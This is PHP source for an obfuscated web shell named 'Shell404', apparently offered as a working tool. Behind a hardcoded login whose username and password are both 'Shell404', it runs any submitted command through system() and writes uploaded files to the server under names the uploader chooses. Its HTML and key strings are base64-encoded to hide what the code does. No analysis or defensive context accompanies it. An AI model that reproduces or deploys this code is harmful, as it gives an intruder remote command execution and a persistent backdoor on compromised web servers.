<?php session_start();$m2=base64_decode('U2hlbGw0MDQ=');$u3=base64_decode('U2hlbGw0MDQ=');$h4=NULL;?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Shell404</title>

    <style>
        html {
            background-color: black;
            color: lime;
            margin-top : 8% ;
            text-align: center;
        }
        h1 {
            margin: 7px 0 0 2px;
            text-shadow: 0px 0px 10px green;
            text-align: center;
        }
        #des {
            color: red;
            margin: 3px;
            text-shadow: 0px 0px 10px red;
            margin-bottom: 30%;
        }
        #input {
            text-align: center;
            width: 62%;
            height: 33px;
            border: 3px solid lime;
            border-radius: 8px;
            margin-top: 1%;
            box-shadow: 0px 0px 20px green;
            background-color: transparent;
            color: lime;
        }
        #submit {
            width: 40%;
            height: 30px;
            border: 3px solid red;
            border-radius: 8px;
            margin-top: 7%;
            box-shadow: 0px 0px 20px red;
            background-color: transparent;
            color: lime;
            text-shadow: 0px 0px 10px red;
        }
    </style>
</head>
<body>

    <?php function f0(){echo base64_decode('DQogICAgPHN0eWxlPg0KICAgICAgICBodG1sIHsNCiAgICAgICAgICAgIHRleHQtYWxpZ246IGxlZnQ7DQogICAgICAgICAgICBtYXJnaW4tdG9wOiAyJTsNCiAgICAgICAgfQ0KICAgICAgICAjaW5wdXQgew0KICAgICAgICAgICAgdGV4dC1hbGlnbjogbGVmdDsNCiAgICAgICAgICAgIHdpZHRoOiA3MyU7DQogICAgICAgICAgICBoZWlnaHQ6IDMzcHg7DQogICAgICAgICAgICBib3JkZXI6IDNweCBzb2xpZCBsaW1lOw0KICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4Ow0KICAgICAgICAgICAgbWFyZ2luLXRvcDogMSU7DQogICAgICAgICAgICBib3gtc2hhZG93OiAwcHggMHB4IDIwcHggZ3JlZW47DQogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsNCiAgICAgICAgICAgIGNvbG9yOiBsaW1lOw0KICAgICAgICB9DQogICAgICAgICNkZXMsIGgxIHsNCiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsNCiAgICAgICAgfQ0KICAgICAgICAjUnVuIHsNCiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsNCiAgICAgICAgICAgIHdpZHRoOiAyMyU7DQogICAgICAgICAgICBoZWlnaHQ6IDQwcHg7DQogICAgICAgICAgICBib3JkZXI6IDNweCBzb2xpZCBsaW1lOw0KICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4Ow0KICAgICAgICAgICAgbWFyZ2luLXRvcDogMSU7DQogICAgICAgICAgICBib3gtc2hhZG93OiAwcHggMHB4IDIwcHggZ3JlZW47DQogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiByZWQ7DQogICAgICAgICAgICBjb2xvcjogbGltZTsNCiAgICAgICAgfQ0KICAgICAgICAjcmVzdWx0IHsNCiAgICAgICAgCWJvcmRlcjogM3B4IHNvbGlkIHJlZDsNCiAgICAgICAgCWJvcmRlci1yYWRpdXM6IDhweDsNCiAgICAgICAgCWJveC1zaGFkb3c6IDBweCAwcHggMjBweCByZWQ7DQogICAgICAgIAliYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsNCiAgICAgICAgCWNvbG9yOiBsaW1lOw0KICAgICAgICAJcGFkZGluZyA6IDNweDsNCiAgICAgICAgfQ0KICAgIDwvc3R5bGU+DQoNCiAgICA8aDE+U2hlbGw0MDQ8L2gxPg0KICAgIDxoNCBpZD0iZGVzIj5TaGVsbDQwNCBQSFAgd2ViIHNoZWxsIGJ5IEFub240MDQ8L2g0Pg0KDQogICAgPGZvcm0gbWV0aG9kPSJQT1NUIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4NCiAgICAgICAgDQogICAgICAgIDxicj4NCiAgICAgICAgPHN0eWxlPg0KICAgICAgICAgICAgI2ZpbGVCdXR0b24sICN1cGxvYWRCdXR0b24gew0KICAgICAgICAgICAgICAgIGhlaWdodDogMzhweDsNCiAgICAgICAgICAgICAgICBib3JkZXI6IDNweCBzb2xpZCBsaW1lOw0KICAgICAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDhweDsNCiAgICAgICAgICAgICAgICBib3gtc2hhZG93OiAwcHggMHB4IDIwcHggZ3JlZW47DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogdHJhbnNwYXJlbnQ7DQogICAgICAgICAgICAgICAgY29sb3I6IGxpbWU7DQogICAgICAgICAgICAgICAgbWFyZ2luLXRvcDogM3B4Ow0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAjZmlsZUJ1dHRvbjphY3RpdmUgew0KICAgICAgICAgICAgCWJhY2tncm91bmQtY29sb3I6IGxpbWU7DQogICAgICAgICAgICAJY29sb3IgOiBibGFjayA7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICN1cGxvYWRCdXR0b24gew0KICAgICAgICAgICAgCWJhY2tncm91bmQtY29sb3I6IHJlZDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICN1cGxvYWRCdXR0b246YWN0aXZlIHsNCiAgICAgICAgICAgIAliYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsNCiAgICAgICAgICAgIAljb2xvciA6IHJlZCA7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgPC9zdHlsZT4NCiAgICAgICAgPGJ1dHRvbiBpZD0iZmlsZUJ1dHRvbiIgdHlwZT0iYnV0dG9uIj5TZWxlY3QgRmlsZTwvYnV0dG9uPg0KICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgaWQ9ImZpbGVVcGxvYWRlciIgbmFtZT0iZmlsZVRvVXBsb2FkIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPg0KICAgICAgICA8YnV0dG9uIGlkPSJ1cGxvYWRCdXR0b24iIHR5cGU9InN1Ym1pdCIgbmFtZT0idXBsb2FkIj5VcGxvYWQ8L2J1dHRvbj4NCg0KICAgICAgICA8c2NyaXB0Pg0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImZpbGVCdXR0b24iKS5vbmNsaWNrID0gZnVuY3Rpb24oKSB7DQogICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImZpbGVVcGxvYWRlciIpLmNsaWNrKCk7DQogICAgICAgICAgICB9Ow0KDQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZmlsZVVwbG9hZGVyIikub25jaGFuZ2UgPSBmdW5jdGlvbigpIHsNCiAgICAgICAgICAgICAgICBhbGVydCgiRmlsZSBzZWxlY3RlZDogIiArIHRoaXMuZmlsZXNbMF0ubmFtZSk7DQogICAgICAgICAgICB9Ow0KICAgICAgICA8L3NjcmlwdD4NCgk8YnI+DQoJPGlucHV0IGlkPSJpbnB1dCIgdHlwZT0idGV4dCIgbmFtZT0iY21kIiBwbGFjZWhvbGRlcj0iQ29tbWFuZCBpbnB1dCI+DQogICAgICAgIDxpbnB1dCBpZD0iUnVuIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJSdW4iPg0KDQogICAgPC9mb3JtPg0KICAgIA==');if(isset($_POST[base64_decode('Y21k')])){$s5=$_POST[base64_decode('Y21k')];if(!empty($s5)){echo base64_decode('PGg0Pk91dHB1dDwvaDQ+');echo base64_decode('PHByZT4=');echo base64_decode('PGRpdiBpZD0icmVzdWx0Ij4=');system($s5);echo base64_decode('PC9kaXY+');echo base64_decode('PC9wcmU+');}else{}}if(isset($_POST[base64_decode('dXBsb2Fk')])){echo base64_decode('PGJyPg==');if(isset($_FILES[base64_decode('ZmlsZVRvVXBsb2Fk')])&&$_FILES[base64_decode('ZmlsZVRvVXBsb2Fk')][base64_decode('ZXJyb3I=')]===UPLOAD_ERR_OK){$o6=$_FILES[base64_decode('ZmlsZVRvVXBsb2Fk')][base64_decode('dG1wX25hbWU=')];$j7=$_FILES[base64_decode('ZmlsZVRvVXBsb2Fk')][base64_decode('bmFtZQ==')];if(move_uploaded_file($o6,$j7)){echo"File uploaded successfully: $j7";}else{echo base64_decode('RXJyb3IgdXBsb2FkaW5nIGZpbGUu');}}else{echo base64_decode('Tm8gZmlsZSB1cGxvYWRlZCBvciB0aGVyZSB3YXMgYW4gZXJyb3Iu');}}}if(isset($_POST[base64_decode('dXNlcm5hbWU=')])&&isset($_POST[base64_decode('cGFzc3dvcmQ=')])){$h4=$_POST[base64_decode('dXNlcm5hbWU=')];$w8=$_POST[base64_decode('cGFzc3dvcmQ=')];if($m2===$h4&&$u3===$w8){$_SESSION[base64_decode('bG9nZ2VkX2lu')]=true;}else{$s9=base64_decode('SW5jb3JyZWN0IHVzZXJuYW1lIG9yIHBhc3N3b3Jk');}}if(isset($_SESSION[base64_decode('bG9nZ2VkX2lu')])&&$_SESSION[base64_decode('bG9nZ2VkX2lu')]===true){f0();}else{n1(isset($s9)?$s9:'');}function n1($s9=''){echo base64_decode('DQogICAgPGgxPlNoZWxsNDA0PC9oMT4NCiAgICA8aDQgaWQ9ImRlcyI+U2hlbGw0MDQgUEhQIHdlYiBzaGVsbCBieSBBbm9uNDA0PC9oND4NCg0KICAgIDxmb3JtIG1ldGhvZD0iUE9TVCI+DQogICAgICAgIDxpbnB1dCByZXF1aXJlZCBpZD0iaW5wdXQiIHR5cGU9InRleHQiIG5hbWU9InVzZXJuYW1lIiBwbGFjZWhvbGRlcj0iRW50ZXIgVXNlcm5hbWUiPg0KICAgICAgICA8YnI+DQogICAgICAgIDxpbnB1dCByZXF1aXJlZCBpZD0iaW5wdXQiIHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzd29yZCIgcGxhY2Vob2xkZXI9IkVudGVyIFBhc3N3b3JkIj4NCiAgICAgICAgPGJyPg0KICAgICAgICA8aW5wdXQgaWQ9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPg0KICAgIDwvZm9ybT4NCiAgICA=');if($s9){echo base64_decode('PGgzIHN0eWxlPSJjb2xvcjogcmVkOyB0ZXh0LXNoYWRvdzogMHB4IDBweCAxMHB4IHJlZDsiPg==').$s9.base64_decode('PC9oMz4=');}}?>

</body>
</html>
